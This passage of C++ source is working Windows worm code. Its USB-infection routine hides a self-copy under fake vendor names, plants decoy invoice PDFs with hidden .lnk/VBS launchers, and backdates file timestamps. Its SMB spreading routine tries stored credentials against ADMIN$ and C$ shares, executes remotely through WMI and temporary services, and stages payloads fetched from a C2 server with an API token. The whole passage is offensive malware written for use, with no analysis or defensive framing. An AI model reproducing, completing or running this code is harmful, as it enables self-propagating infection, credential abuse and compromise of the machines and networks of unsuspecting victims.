            u.QuadPart -= (ULONGLONG)minutes * 60ull * 10000000ull;
            FILETIME f;
            f.dwLowDateTime = u.LowPart;
            f.dwHighDateTime = u.HighPart;
            SetFileTime(h, &f, &f, &f);
            CloseHandle(h);
        }

        static std::string BuildDecoyPdf(const std::wstring& company,
            const std::wstring& amount) {
            std::string text =
                "INVOICE\n" + utils::narrow(company) + "\n" +
                "Amount due: USD " + utils::narrow(amount) + "\n" +
                "Payment terms: 14 days\n";

            std::vector<std::string> obj(5);
            obj[0] = "<< /Type /Catalog /Pages 2 0 R >>";
            obj[1] = "<< /Type /Pages /Kids [3 0 R] /Count 1 >>";
            obj[2] = "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
                     "/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>";
            std::string stream = "BT /F1 20 Tf 72 720 Td ";
            bool first = true;
            size_t pos = 0;
            while (pos < text.size()) {
                size_t nl = text.find('\n', pos);
                std::string line = text.substr(pos, nl == std::string::npos
                    ? std::string::npos : nl - pos);
                std::string esc;
                for (char ch : line) {
                    if (ch == '(' || ch == ')' || ch == '\\') esc.push_back('\\');
                    esc.push_back(ch);
                }
                if (!first) stream += "0 -30 Td ";
                stream += "(" + esc + ") Tj ";
                first = false;
                if (nl == std::string::npos) break;
                pos = nl + 1;
            }
            stream += "ET\n";
            obj[3] = "<< /Length " + std::to_string(stream.size()) + " >>\nstream\n" +
                stream + "endstream";
            obj[4] = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>";

            std::string out = "%PDF-1.4\n";
            std::vector<size_t> offsets;
            for (size_t i = 0; i < obj.size(); i++) {
                offsets.push_back(out.size());
                out += std::to_string(i + 1) + " 0 obj\n" + obj[i] + "\nendobj\n";
            }
            size_t xref = out.size();
            out += "xref\n0 " + std::to_string(obj.size() + 1) + "\n";
            out += "0000000000 65535 f \n";
            for (size_t off : offsets) {
                char line[32];
                sprintf_s(line, sizeof(line), "%010zu 00000 n \n", off);
                out += line;
            }
            out += "trailer\n<< /Size " + std::to_string(obj.size() + 1) +
                " /Root 1 0 R >>\nstartxref\n" + std::to_string(xref) + "\n%%EOF\n";
            return out;
        }

        static bool WriteLnk(const std::wstring& lnkPath, const std::wstring& target,
            const std::wstring& args, int iconIndex) {
            bool ok = false;
            IShellLinkW* psl = nullptr;
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                IID_IShellLinkW, (void**)&psl))) {
                psl->SetPath(target.c_str());
                psl->SetArguments(args.c_str());
                psl->SetShowCmd(SW_HIDE);
                psl->SetDescription(L"Invoice");
                psl->SetIconLocation(L"%SystemRoot%\\system32\\imageres.dll", iconIndex);
                IPersistFile* pf = nullptr;
                if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&pf))) {
                    ok = SUCCEEDED(pf->Save(lnkPath.c_str(), TRUE));
                    pf->Release();
                }
                psl->Release();
            }
            return ok;
        }

        static bool WriteVbs(const std::wstring& vbsPath, const std::wstring& payload,
            const std::wstring& decoy) {
            std::wstring s = utils::widen(X("Set sh = CreateObject(\"WScript.Shell\")")) +
                L"\r\n";
            s += utils::widen(X("sh.Run Chr(34) & \"")) + payload +
                utils::widen(X("\" & Chr(34), 0, False")) + L"\r\n";
            s += utils::widen(X("sh.Run Chr(34) & \"")) + decoy +
                utils::widen(X("\" & Chr(34), 1, False")) + L"\r\n";
            return utils::WriteUtf8(vbsPath, utils::narrow(s));
        }

        static bool MarkerCurrent(const std::wstring& marker) {
            HANDLE h = CreateFileW(marker.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            char buf[128]{};
            DWORD got = 0;
            ReadFile(h, buf, sizeof(buf) - 1, &got, NULL);
            CloseHandle(h);
            std::string s(buf, got);
            return s.find(BuildStamp()) == 0;
        }

        static void InfectUsb(const std::wstring& root) {
            if (!g_usbEnabled.load()) return;

            std::wstring marker = root + config::kUsbMarker;
            if (MarkerCurrent(marker)) return;

            ULARGE_INTEGER freeBytes{};
            if (!GetDiskFreeSpaceExW(root.c_str(), &freeBytes, NULL, NULL)) return;
            if (freeBytes.QuadPart < 64ull * 1024 * 1024) return;

            std::wstring vxdir = root + L".vx\\";
            CreateDirectoryW(vxdir.c_str(), NULL);
            SetFileAttributesW(vxdir.c_str(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

            const wchar_t* payloadNames[] = {
                L"Adobe_Update.exe", L"DriverSetup.exe", L"PrintSpool.exe",
                L"HP_Support.exe", L"Realtek_Audio.exe"
            };
            int pick = (int)(Rand32() % (sizeof(payloadNames) / sizeof(payloadNames[0])));
            std::wstring exe = vxdir + payloadNames[pick];
            SetFileAttributesW(exe.c_str(), FILE_ATTRIBUTE_NORMAL);
            if (!CopyFileW(utils::SelfPath().c_str(), exe.c_str(), FALSE)) return;
            utils::Hide(exe);

            std::wstring company = CompanyTag();
            std::wstring date = DateTag();
            std::wstring amount = std::to_wstring(100 + (Rand32() % 9000)) + L".00";

            std::wstring wscript = utils::widen(X("C:\\Windows\\System32\\wscript.exe"));

            struct Bait {
                std::wstring dir;
                std::wstring name;
            };
            std::vector<Bait> baits;
            baits.push_back({ root, L"Invoice_" + company + L"_" + date + L".pdf" });
            baits.push_back({ root + L"Invoices\\",
                L"Remittance_" + company + L"_" + date + L".pdf" });
            baits.push_back({ root + L"Scans\\",
                L"Scan_" + company + L"_" + date + L".pdf" });

            std::vector<std::wstring> written;
            int lures = 0;
            for (size_t bi = 0; bi < baits.size(); bi++) {
                const auto& b = baits[bi];
                CreateDirectoryW(b.dir.c_str(), NULL);
                std::wstring decoy = b.dir + b.name;
                if (!utils::WriteUtf8(decoy, BuildDecoyPdf(company, amount)))
                    continue;

                // One script per lure so every shortcut opens its own invoice.
                std::wstring vbs = vxdir + L"~vx" + std::to_wstring(bi) + L".vbs";
                std::wstring lnk = decoy + L".lnk";
                bool linked = false;
                bool vbsOk = false;
                if (WriteVbs(vbs, exe, decoy)) {
                    vbsOk = true;
                    linked = WriteLnk(lnk, wscript, L"\"" + vbs + L"\"", 2);
                }
                if (!linked) {
                    // Fallback: cmd launcher if the script could not be written.
                    std::wstring cargs = utils::widen(X("/c start \"\" \"")) +
                        exe + utils::widen(X("\" & start \"\" \"")) + decoy + L"\"";
                    linked = WriteLnk(lnk,
                        utils::widen(X("C:\\Windows\\System32\\cmd.exe")), cargs, 2);
                }
                if (linked) {
                    written.push_back(lnk);
                    written.push_back(decoy);
                    if (vbsOk) written.push_back(vbs);
                    lures++;
                }
            }
            written.push_back(exe);

            long long back = 30 + (long long)(Rand32() % (72 * 60));
            for (const auto& f : written) TouchBack(f, back);

            if (lures > 0) {
                utils::WriteUtf8(marker, BuildStamp() + "|" +
                    utils::narrow(utils::RandomHex(12)));
                SetFileAttributesW(marker.c_str(),
                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            }

            g_usbInfections.fetch_add(1);
            err::Report("usb", std::string(lures ? "infected " : "partial ") +
                utils::narrow(root) +
                " lures=" + std::to_string(lures) +
                " stamp=" + BuildStamp());
        }

        static void ScanRemovable() {
            if (!g_usbEnabled.load()) return;
            DWORD mask = GetLogicalDrives();
            for (int i = 0; i < 26; i++) {
                if (!(mask & (1u << i))) continue;
                wchar_t root[4] = { (wchar_t)(L'A' + i), L':', L'\\', 0 };
                if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
                if (!IsUsbStick(root)) continue;
                InfectUsb(root);
            }
        }

        static std::atomic<bool> g_usbEvent{ false };

        static LRESULT CALLBACK UsbWndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp) {
            if (msg == WM_DEVICECHANGE) g_usbEvent.store(true);
            return DefWindowProcW(h, msg, wp, lp);
        }

        static DWORD WINAPI UsbThread(LPVOID) {
            CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
            ScanRemovable();

            WNDCLASSW wc{};
            wc.lpfnWndProc = UsbWndProc;
            wc.hInstance = GetModuleHandleW(NULL);
            wc.lpszClassName = L"vxusbmon";
            RegisterClassW(&wc);

            HWND hwnd = CreateWindowExW(0, L"vxusbmon", L"", 0, 0, 0, 0, 0,
                HWND_MESSAGE, NULL, wc.hInstance, NULL);
            HDEVNOTIFY notify = NULL;
            if (hwnd) {
                DEV_BROADCAST_DEVICEINTERFACE filter{};
                filter.dbcc_size = sizeof(filter);
                filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
                filter.dbcc_classguid = GUID_DEVINTERFACE_VOLUME;
                notify = RegisterDeviceNotificationW(hwnd, &filter,
                    DEVICE_NOTIFY_WINDOW_HANDLE);
            }

            if (!hwnd || !notify) {
                for (;;) {
                    Sleep(5000);
                    ScanRemovable();
                }
            }

            MSG msg{};
            while (GetMessageW(&msg, NULL, 0, 0) > 0) {
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
                if (g_usbEvent.exchange(false)) ScanRemovable();
            }
            if (notify) UnregisterDeviceNotification(notify);
            return 0;
        }

        static void StartUsbWatcher() {
            HANDLE h = CreateThread(NULL, 0, UsbThread, NULL, 0, NULL);
            if (h) CloseHandle(h);
        }
        // ---------------- SMB ----------------

        static bool ProbePort(const char* ip, uint16_t port, uint32_t timeoutMs) {
            EnsureWsa();
            if (!g_wsa.load()) return false;

            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) return false;

            u_long nb = 1;
            ioctlsocket(s, FIONBIO, &nb);

            sockaddr_in sa{};
            sa.sin_family = AF_INET;
            sa.sin_port = htons(port);
            inet_pton(AF_INET, ip, &sa.sin_addr);

            connect(s, (sockaddr*)&sa, sizeof(sa));

            fd_set wf;
            FD_ZERO(&wf);
            FD_SET(s, &wf);
            timeval tv{ (long)(timeoutMs / 1000), (long)((timeoutMs % 1000) * 1000) };

            bool open = false;
            if (select(0, NULL, &wf, NULL, &tv) > 0) {
                int err = 0, len = sizeof(err);
                getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&err, &len);
                open = (err == 0);
            }
            closesocket(s);
            return open;
        }

        static bool ConnectUnc(NETRESOURCEW& nr, const std::wstring& unc,
            const wchar_t* user, const wchar_t* pass) {
            DWORD rc = WNetAddConnection2W(&nr, (LPWSTR)pass, (LPWSTR)user, 0);
            if (rc == ERROR_SESSION_CREDENTIAL_CONFLICT) {
                WNetCancelConnection2W(unc.c_str(), 0, TRUE);
                rc = WNetAddConnection2W(&nr, (LPWSTR)pass, (LPWSTR)user, 0);
            }
            return rc == NO_ERROR;
        }

        static bool MountShare(const std::wstring& unc, std::wstring& used) {
            NETRESOURCEW nr{};
            nr.dwType = RESOURCETYPE_DISK;
            nr.lpRemoteName = (LPWSTR)unc.c_str();
            if (ConnectUnc(nr, unc, NULL, NULL)) {
                used = unc;
                return true;
            }
            for (const auto& c : config::kSpreadCreds) {
                if (ConnectUnc(nr, unc, c.first.c_str(), c.second.c_str())) {
                    used = unc;
                    return true;
                }
            }
            return false;
        }

        // Remote process creation through WMI, used when SCM is blocked.
        static bool WmiExec(const std::wstring& hostW, const std::wstring& command) {
            bool ok = false;
            HRESULT hrCo = CoInitializeEx(NULL, COINIT_MULTITHREADED);
            IWbemLocator* loc = nullptr;
            if (SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                IID_IWbemLocator, (void**)&loc))) {
                std::wstring ns = L"\\\\" + hostW + L"\\" +
                    utils::widen(X("root\\cimv2"));
                BSTR bns = SysAllocString(ns.c_str());
                IWbemServices* svc = nullptr;
                if (bns && SUCCEEDED(loc->ConnectServer(bns, NULL, NULL, 0, NULL, 0, 0, &svc))) {
                    CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
                    BSTR bcls = SysAllocString(L"Win32_Process");
                    IWbemClassObject* cls = nullptr;
                    if (bcls && SUCCEEDED(svc->GetObject(bcls, 0, NULL, &cls, NULL))) {
                        IWbemClassObject* inDef = nullptr;
                        if (SUCCEEDED(cls->GetMethod(L"Create", 0, &inDef, NULL)) && inDef) {
                            IWbemClassObject* inInst = nullptr;
                            if (SUCCEEDED(inDef->SpawnInstance(0, &inInst))) {
                                VARIANT v;
                                VariantInit(&v);
                                v.vt = VT_BSTR;
                                v.bstrVal = SysAllocString(command.c_str());
                                if (v.bstrVal) {
                                    inInst->Put(L"CommandLine", 0, &v, 0);
                                    VariantClear(&v);
                                }
                                BSTR bmeth = SysAllocString(L"Create");
                                IWbemClassObject* outObj = nullptr;
                                ok = bmeth && SUCCEEDED(svc->ExecMethod(bcls, bmeth, 0,
                                    NULL, inInst, &outObj, NULL));
                                if (outObj) outObj->Release();
                                if (bmeth) SysFreeString(bmeth);
                                inInst->Release();
                            }
                            inDef->Release();
                        }
                        cls->Release();
                    }
                    if (bcls) SysFreeString(bcls);
                    svc->Release();
                }
                if (bns) SysFreeString(bns);
                loc->Release();
            }
            if (SUCCEEDED(hrCo)) CoUninitialize();
            return ok;
        }

        // Operator-driven lateral command: run on the target, capture stdout
        // into a temp file, read it back over ADMIN$/C$.
        static bool RunRemoteCommand(const std::wstring& hostW,
            const std::wstring& command, std::string& output) {
            output.clear();
            if (hostW.empty() || command.empty() || command.size() > 2048) return false;

            std::wstring adminShare = L"\\\\" + hostW + L"\\ADMIN$";
            std::wstring cShare = L"\\\\" + hostW + L"\\C$";
            std::wstring useShare, remoteBase, targetDir;
            if (MountShare(adminShare, useShare)) {
                remoteBase = adminShare + L"\\Temp\\";
                targetDir = L"C:\\Windows\\Temp\\";
            }
            else if (MountShare(cShare, useShare)) {
                useShare = cShare;
                remoteBase = cShare + L"\\Windows\\Temp\\";
                targetDir = L"C:\\Windows\\Temp\\";
            }
            else {
                return false;
            }

            std::wstring name = L"vxout_" + utils::RandomHex(8) + L".txt";
            std::wstring targetPath = targetDir + name;
            std::wstring uncPath = remoteBase + name;
            std::wstring cmd = utils::widen(X("cmd.exe /c ")) + command +
                L" > \"" + targetPath + L"\" 2>&1";

            bool started = WmiExec(hostW, cmd);
            if (!started) {
                SC_HANDLE scm = OpenSCManagerW(hostW.c_str(), NULL,
                    SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
                if (scm) {
                    std::wstring svcName = L"vx" + utils::RandomHex(8);
                    SC_HANDLE svc = CreateServiceW(scm, svcName.c_str(), svcName.c_str(),
                        SERVICE_START | DELETE, SERVICE_WIN32_OWN_PROCESS,
                        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                        cmd.c_str(), NULL, NULL, NULL, NULL, NULL);
                    if (svc) {
                        started = StartServiceW(svc, 0, NULL) != FALSE;
                        Sleep(1200);
                        DeleteService(svc);
                        CloseServiceHandle(svc);
                    }
                    CloseServiceHandle(scm);
                }
            }

            bool got = false;
            if (started) {
                for (int i = 0; i < 40 && !got; i++) {
                    Sleep(500);
                    HANDLE h = CreateFileW(uncPath.c_str(), GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (h == INVALID_HANDLE_VALUE) continue;
                    DWORD size = GetFileSize(h, NULL);
                    if (size == INVALID_FILE_SIZE || size == 0) {
                        CloseHandle(h);
                        if (i > 6) break;
                        continue;
                    }
                    if (size > 32768) size = 32768;
                    output.resize(size);
                    DWORD read = 0;
                    if (ReadFile(h, &output[0], size, &read, NULL) && read > 0) {
                        output.resize(read);
                        got = true;
                    }
                    CloseHandle(h);
                }
                DeleteFileW(uncPath.c_str());
            }
            WNetCancelConnection2W(useShare.c_str(), 0, FALSE);
            return got;
        }

        static void AddDomainHosts(std::vector<uint32_t>& out) {
            SERVER_INFO_100* buf = nullptr;
            DWORD read = 0, total = 0, resume = 0;
            NET_API_STATUS st = NetServerEnum(NULL, 100, (LPBYTE*)&buf,
                MAX_PREFERRED_LENGTH, &read, &total,
                (DWORD)(SV_TYPE_SERVER | SV_TYPE_WORKSTATION), NULL, &resume);
            if ((st == NERR_Success || st == ERROR_MORE_DATA) && buf) {
                for (DWORD i = 0; i < read && out.size() < 512; i++) {
                    if (!buf[i].sv100_name) continue;
                    std::string name = utils::narrow(buf[i].sv100_name);
                    addrinfo* ai = nullptr;
                    if (getaddrinfo(name.c_str(), NULL, NULL, &ai) != 0) continue;
                    for (addrinfo* p = ai; p; p = p->ai_next) {
                        if (p->ai_family != AF_INET) continue;
                        uint32_t ip = ntohl(((sockaddr_in*)p->ai_addr)->sin_addr.s_addr);
                        out.push_back(ip);
                        break;
                    }
                    freeaddrinfo(ai);
                }
                NetApiBufferFree(buf);
            }
        }

        static std::mutex g_attemptMtx;
        static std::unordered_set<uint32_t> g_attempted;

        static bool MarkAttempt(uint32_t ip) {
            std::lock_guard<std::mutex> g(g_attemptMtx);
            return g_attempted.insert(ip).second;
        }

        static uint32_t InfectedCount() { return g_infected.load(); }

        static size_t AttemptedCount() {
            std::lock_guard<std::mutex> g(g_attemptMtx);
            return g_attempted.size();
        }

        // Persistent attempt history so a host is not retried for N days,
        // even across reboots or a new payload instance.
        static std::wstring HistoryPath() {
            return state::DirPath() + L"\\hosts";
        }

        static std::mutex g_histMtx;
        static std::unordered_map<uint32_t, long long> g_hist;
        static std::once_flag g_histOnce;

        static void LoadHistory() {
            std::call_once(g_histOnce, [] {
                std::ifstream f(utils::extended(HistoryPath()).c_str());
                std::string line;
                while (std::getline(f, line)) {
                    if (line.empty()) continue;
                    size_t a = line.find('|');
                    size_t b = a == std::string::npos ? std::string::npos : line.find('|', a + 1);
                    if (a == std::string::npos || b == std::string::npos) continue;
                    uint32_t ip = 0;
                    if (inet_pton(AF_INET, line.substr(0, a).c_str(), &ip) != 1) continue;
                    long long ts = atoll(line.c_str() + a + 1);
                    g_hist[ip] = ts;
                }
                });
        }

        static bool RecentlyAttempted(uint32_t ip) {
            LoadHistory();
            std::lock_guard<std::mutex> g(g_histMtx);
            auto it = g_hist.find(ip);
            if (it == g_hist.end()) return false;
            long long age = (long long)time(nullptr) - it->second;
            return age < (long long)config::kSpreadHistoryDays * 86400;
        }

        static void RecordAttempt(uint32_t ip, const char* status) {
            LoadHistory();
            {
                std::lock_guard<std::mutex> g(g_histMtx);
                g_hist[ip] = (long long)time(nullptr);
            }
            CreateDirectoryW(utils::extended(state::DirPath()).c_str(), NULL);
            std::ofstream f(utils::extended(HistoryPath()).c_str(),
                std::ios::app | std::ios::binary);
            if (!f.is_open()) return;
            f << IpToString(ip) << "|" << (long long)time(nullptr)
              << "|" << (status ? status : "?") << "\n";
            f.flush();
            SetFileAttributesW(utils::extended(HistoryPath()).c_str(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }

        static bool CopyToRemote(const std::wstring& remotePath) {
            HANDLE hOut = CreateFileW(remotePath.c_str(), GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hOut == INVALID_HANDLE_VALUE) return false;

            HANDLE hIn = CreateFileW(utils::SelfPath().c_str(), GENERIC_READ,
                FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hIn == INVALID_HANDLE_VALUE) {
                CloseHandle(hOut);
                DeleteFileW(remotePath.c_str());
                return false;
            }

            uint8_t buf[64 * 1024];
            bool ok = true;
            DWORD r = 0;
            while (ok && ReadFile(hIn, buf, sizeof(buf), &r, NULL) && r > 0) {
                if (!utils::WriteExact(hOut, buf, r)) ok = false;
            }
            CloseHandle(hIn);
            CloseHandle(hOut);
            if (!ok) DeleteFileW(remotePath.c_str());
            return ok;
        }

#pragma pack(push, 1)
        struct StageFooterV3 {
            char magic[8];     // "VXPAY003"
            uint64_t size;
            uint32_t crc;
            uint8_t salt[16];
            uint8_t nonce[12];
            uint8_t tag[16];
            uint8_t hmac[32];
        };
        struct StageFooterV2 {
            char magic[8];     // "VXPAY002"
            uint64_t size;
            uint32_t crc;
            uint8_t key[32];
            uint8_t hmac[32];
        };
#pragma pack(pop)

        static bool ReadSelfBytes(std::vector<uint8_t>& out) {
            HANDLE h = CreateFileW(utils::SelfPath().c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            LARGE_INTEGER sz{};
            if (!GetFileSizeEx(h, &sz) || sz.QuadPart <= 0 || sz.QuadPart > 8ll * 1024 * 1024) {
                CloseHandle(h);
                return false;
            }
            out.resize((size_t)sz.QuadPart);
            size_t total = 0;
            while (total < out.size()) {
                DWORD got = 0;
                DWORD want = (DWORD)(out.size() - total);
                if (!ReadFile(h, out.data() + total, want, &got, NULL) || got == 0) break;
                total += got;
            }
            CloseHandle(h);
            return total == out.size();
        }

        // The loader half of our own stager, so the remote side can pull the
        // current payload from C2 instead of receiving a 700 KB copy.
        static bool ExtractLoaderPrefix(std::vector<uint8_t>& loader) {
            std::vector<uint8_t> self;
            if (!ReadSelfBytes(self)) return false;

            size_t blockSize = 0;
            if (self.size() > sizeof(StageFooterV3)) {
                StageFooterV3 f{};
                memcpy(&f, self.data() + self.size() - sizeof(f), sizeof(f));
                if (memcmp(f.magic, "VXPAY003", 8) == 0 &&
                    f.size != 0 && f.size <= self.size() - sizeof(f)) {
                    blockSize = sizeof(f) + (size_t)f.size;
                }
            }
            if (blockSize == 0 && self.size() > sizeof(StageFooterV2)) {
                StageFooterV2 f{};
                memcpy(&f, self.data() + self.size() - sizeof(f), sizeof(f));
                if (memcmp(f.magic, "VXPAY002", 8) == 0 &&
                    f.size != 0 && f.size <= self.size() - sizeof(f)) {
                    blockSize = sizeof(f) + (size_t)f.size;
                }
            }
            if (blockSize == 0) return false;

            size_t n = self.size() - blockSize;
            if (n < 2 || self[0] != 'M' || self[1] != 'Z') return false;
            loader.assign(self.begin(), self.begin() + n);
            return true;
        }

        static bool CopyBufferToRemote(const std::vector<uint8_t>& data,
            const std::wstring& remotePath) {
            if (data.empty()) return false;
            HANDLE hOut = CreateFileW(remotePath.c_str(), GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hOut == INVALID_HANDLE_VALUE) return false;
            bool ok = utils::WriteExact(hOut, data.data(), (DWORD)data.size());
            CloseHandle(hOut);
            if (!ok) DeleteFileW(remotePath.c_str());
            return ok;
        }

        static bool RemoteMarkerExists(const std::wstring& hostW) {
            std::wstring share = L"\\\\" + hostW + L"\\C$";
            std::wstring used;
            if (!MountShare(share, used)) return false;
            std::wstring p = share + L"\\ProgramData\\VEX\\vx.id";
            bool exists = GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES;
            WNetCancelConnection2W(share.c_str(), 0, FALSE);
            return exists;
        }

        static void WriteRemoteMarker(const std::wstring& hostW) {
            std::wstring share = L"\\\\" + hostW + L"\\C$";
            std::wstring used;
            if (!MountShare(share, used)) return;
            std::wstring dir = share + L"\\ProgramData\\VEX";
            CreateDirectoryW(dir.c_str(), NULL);
            std::wstring p = dir + L"\\vx.id";
            HANDLE h = CreateFileW(p.c_str(), GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                std::string id = utils::narrow(utils::RandomHex(16));
                DWORD w = 0;
                WriteFile(h, id.data(), (DWORD)id.size(), &w, NULL);
                CloseHandle(h);
            }
            WNetCancelConnection2W(share.c_str(), 0, FALSE);
        }

        // PsExec-style: write to ADMIN$ (or C$), then create+start a service
        // whose image path is the LOCAL file the share already delivered.
        static bool InfectHost(uint32_t ip) {
            if (!g_enabled.load()) return false;
            uint32_t current = g_infected.load();
            while (current < config::kSpreadMaxHosts &&
                   !g_infected.compare_exchange_weak(current, current + 1)) {
            }
            if (current >= config::kSpreadMaxHosts) return false;
            bool committed = false;
            struct Reserve {
                std::atomic<uint32_t>& counter;
                bool& done;
                ~Reserve() { if (!done) counter.fetch_sub(1); }
            } reserve{ g_infected, committed };

            std::wstring hostW = utils::widen(IpToString(ip));
            if (RemoteMarkerExists(hostW)) return false;

            std::wstring adminShare = L"\\\\" + hostW + L"\\ADMIN$";
            std::wstring cShare = L"\\\\" + hostW + L"\\C$";
            std::wstring remoteShare = adminShare;
            std::wstring remoteBase;

            std::wstring mounted;
            wchar_t winDir[MAX_PATH]{};
            GetWindowsDirectoryW(winDir, MAX_PATH);
            std::wstring winRoot = winDir;
            if (MountShare(adminShare, mounted)) {
                remoteBase = adminShare + L"\\Temp\\";
            }
            else if (MountShare(cShare, mounted)) {
                remoteShare = cShare;
                std::wstring rel = winRoot.size() > 2 ? winRoot.substr(3) : L"Windows";
                remoteBase = cShare + L"\\" + rel + L"\\Temp\\";
            }
            else {
                return false;
            }

            std::wstring name = L"vex_" + utils::RandomHex(10) + L".exe";
            std::wstring remotePath = remoteBase + name;
            std::wstring localPath = winRoot + L"\\Temp\\" + name;

            // Prefer staged delivery: smaller remote write, payload fetched
            // from C2 and HMAC-verified by the loader. The stage arguments are
            // added even when our own file is a bare loader, so second-generation
            // hosts can pull the payload instead of running an empty loader.
            std::wstring remoteCmd = L"\"" + localPath + L"\"";
            bool c2ok = config::kSpreadStagedDelivery &&
                !config::kC2Host.empty() &&
                !config::kApiToken.empty() &&
                config::kC2Host.find(L"{{") == std::wstring::npos;
            std::wstring remoteTokenFile;
            if (c2ok) {
                std::wstring url = L"https://" + config::kC2Host + L"/api/stage";
                remoteTokenFile = remoteBase + name + L".tok";
                std::string tokStr = utils::narrow(config::kApiToken);
                std::vector<uint8_t> tok(tokStr.begin(), tokStr.end());
                if (CopyBufferToRemote(tok, remoteTokenFile)) {
                    SetFileAttributesW(remoteTokenFile.c_str(),
                        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    remoteCmd += L" --stage \"" + url + L"\" --token-file \"" +
                        localPath + L".tok\"";
                }
                else {
                    c2ok = false;
                }
            }

            bool delivered = false;
            std::vector<uint8_t> loader;
            if (c2ok && ExtractLoaderPrefix(loader))
                delivered = CopyBufferToRemote(loader, remotePath);
            if (!delivered) delivered = CopyToRemote(remotePath);

            bool fired = false;
            if (delivered) {
                std::wstring svcName = L"vx" + utils::RandomHex(8);
                SC_HANDLE scm = OpenSCManagerW(hostW.c_str(), NULL,
                    SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
                if (scm) {
                    SC_HANDLE svc = CreateServiceW(scm, svcName.c_str(), svcName.c_str(),
                        SERVICE_START | DELETE | SERVICE_QUERY_STATUS,
                        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                        remoteCmd.c_str(), NULL, NULL, NULL, NULL, NULL);
                    if (svc) {
                        fired = StartServiceW(svc, 0, NULL) != FALSE;
                        Sleep(1500);
                        DeleteService(svc);
                        CloseServiceHandle(svc);
                    }
                    CloseServiceHandle(scm);
                }
            }
            if (!fired) {
                // SCM wrapper: cmd starts the payload detached; the service
                // itself reports failure, which is harmless.
                std::wstring wcmd = utils::widen(X("cmd.exe /c start \"\" "))
                    + remoteCmd;
                SC_HANDLE scm2 = OpenSCManagerW(hostW.c_str(), NULL,
                    SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
                if (scm2) {
                    std::wstring svc2 = L"vx" + utils::RandomHex(8);
                    SC_HANDLE svc = CreateServiceW(scm2, svc2.c_str(), svc2.c_str(),
                        SERVICE_START | DELETE, SERVICE_WIN32_OWN_PROCESS,
                        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                        wcmd.c_str(), NULL, NULL, NULL, NULL, NULL);
                    if (svc) {
                        fired = StartServiceW(svc, 0, NULL) != FALSE;
                        Sleep(1200);
                        DeleteService(svc);
                        CloseServiceHandle(svc);
                    }
                    CloseServiceHandle(scm2);
                }
            }
            if (!fired) {
                std::wstring cmd = utils::widen(X("cmd.exe /c start \"\" "))
                    + remoteCmd;
                fired = WmiExec(hostW, cmd);
            }
            WNetCancelConnection2W(remoteShare.c_str(), 0, FALSE);

            if (fired) {
                WriteRemoteMarker(hostW);
                committed = true;
                err::Report("smb", "spread " + IpToString(ip));
            }
            return fired;
        }

        struct HostQueue {
            std::mutex m;
            std::condition_variable cv;
            std::deque<uint32_t> q;
            bool done = false;

            void Push(uint32_t ip) {
                std::lock_guard<std::mutex> g(m);
                q.push_back(ip);
                cv.notify_one();
            }
            bool Pop(uint32_t& out) {
                std::unique_lock<std::mutex> g(m);
                cv.wait(g, [&] { return done || !q.empty(); });
                if (q.empty()) return false;
                out = q.front();
                q.pop_front();
                return true;
            }
            void Close() {
                std::lock_guard<std::mutex> g(m);
                done = true;
                cv.notify_all();
            }
        };

        static DWORD WINAPI SmbWorker(LPVOID param) {
            HostQueue* queue = (HostQueue*)param;
            uint32_t ip = 0;
            while (queue->Pop(ip)) {
                if (!g_enabled.load() || g_infected.load() >= config::kSpreadMaxHosts)
                    continue;
                Jitter(config::kSpreadJitterMs);
                if (!IpAllowed(ip)) continue;
                if (RecentlyAttempted(ip)) continue;
                if (!ProbePort(IpToString(ip).c_str(), config::kSmbPort,
                    config::kSmbConnectTimeoutMs)) continue;
                if (!MarkAttempt(ip)) continue;
